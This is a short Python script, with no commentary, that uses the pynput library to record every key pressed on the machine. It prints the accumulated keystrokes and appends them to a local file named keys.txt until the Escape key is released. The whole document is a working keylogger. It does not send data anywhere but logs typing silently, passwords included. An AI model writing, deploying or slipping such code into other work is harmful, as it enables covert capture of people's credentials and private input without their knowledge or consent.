from pynput.keyboard import Key, Controller,Listener
keyboard = Controller()
keys=[]
def on_press(key):
    global keys
    string = str(key).replace("'","")
    keys.append(string)
    main_string = "".join(keys)
    print(main_string)
    
    with open('keys.txt', 'a') as f:
        f.write(main_string)   
        keys= []     
        
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press,on_release=on_release) as listener:
    listener.join()